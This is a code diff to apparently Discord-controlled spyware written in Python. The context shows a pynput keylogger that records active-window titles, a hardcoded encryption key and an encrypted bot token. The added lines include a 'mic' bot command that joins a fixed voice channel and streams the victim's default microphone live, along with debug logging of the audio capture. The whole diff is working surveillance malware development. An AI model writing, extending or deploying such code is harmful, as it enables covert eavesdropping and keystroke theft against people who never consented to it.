@@ -37,7 +37,7 @@ from cryptography.fernet import Fernet
 from pynput.keyboard import Key, Listener
 import asyncio
 import win32gui
-
+import logging
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
 encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
@@ -122,6 +122,7 @@ keycodes = {
 }
 
 held_keys = set()
+logging.basicConfig(filename="mic_debug.log", level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
 def get_active_window():
     """Get the active window title."""
@@ -1035,16 +1036,6 @@ async def recordmic(ctx, user):
             await ctx.send(f"Error occurred: {str(e)}")
 
 
-@bot.command(name="leave")
-async def leave(ctx):
-        vc = discord.utils.get(bot.voice_clients, guild=ctx.guild)
-    
-        if vc:
-            await vc.disconnect()
-            await ctx.send("left the vc")
-        else:
-            await ctx.send("im not ina vc dumbass")
-
 
 bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
 opuslib_path = os.path.abspath(os.path.join(bundle_dir, './crack.dll'))
@@ -1055,6 +1046,7 @@ class PyAudioPCM(discord.AudioSource):
     def __init__(self, rate=None, chunk=960) -> None:
         p = pyaudio.PyAudio()
         self.chunks = chunk
+
 
         default_device_index = p.get_default_input_device_info()['index']
         device_info = p.get_device_info_by_index(default_device_index)
@@ -1067,7 +1059,10 @@ class PyAudioPCM(discord.AudioSource):
         if self.channels < 1:
             self.channels = 1
 
-        print(f"Using device {default_device_index} - Channels: {self.channels}, Sample Rate: {self.sample_rate}")
+
+        debug_msg = f"Using device {default_device_index} - Channels: {self.channels}, Sample Rate: {self.sample_rate}"
+        logging.debug(debug_msg)
+        print(debug_msg)
 
 
         try:
@@ -1080,11 +1075,55 @@ class PyAudioPCM(discord.AudioSource):
                 frames_per_buffer=self.chunks
             )
         except Exception as e:
-            print(f"Failed to open input stream: {e}")
+            error_msg = f"Failed to open input stream: {e}"
+            logging.error(error_msg)
+            print(error_msg)
             raise
 
+        self.p = p
+
     def read(self) -> bytes:
-        return self.input_stream.read(self.chunks)
+        try:
+            audio_data = self.input_stream.read(self.chunks)
+
+
+            data_len_msg = f"Raw Audio Data Length: {len(audio_data)}"
+            logging.debug(data_len_msg)
+            print(data_len_msg)
+
+
+            audio_np = np.frombuffer(audio_data, dtype=np.int16)
+            debug_audio_data = f"Audio Data (first 10 samples): {audio_np[:10]}"
+            logging.debug(debug_audio_data)
+            print(debug_audio_data)
+
+
+            return audio_data
+        except Exception as e:
+            error_msg = f"Error reading audio: {e}"
+            logging.error(error_msg)
+            print(error_msg)
+            raise
+
+
+@bot.command(name="mic")
+async def recordmic(ctx, user):
+    if user == name:
+        try:
+            channel = bot.get_channel(1335115941444587615)
+            if channel:
+                vc = await channel.connect(self_deaf=True)
+                await ctx.send(f"Connected to channel {channel.name}.")
+            else:
+                await ctx.send("Channel not found.")
+
+            vc.play(PyAudioPCM())
+            await ctx.send(f'`[{current_time()}] Joined voice-channel and streaming microphone in realtime`')
+
+        except Exception as e:
+            await ctx.send(f"Error occurred: {str(e)}")
+            logging.error(f"Error occurred: {str(e)}")
+            print(f"Error: {str(e)}")
 
 
 def get_value_by_label(label, output):
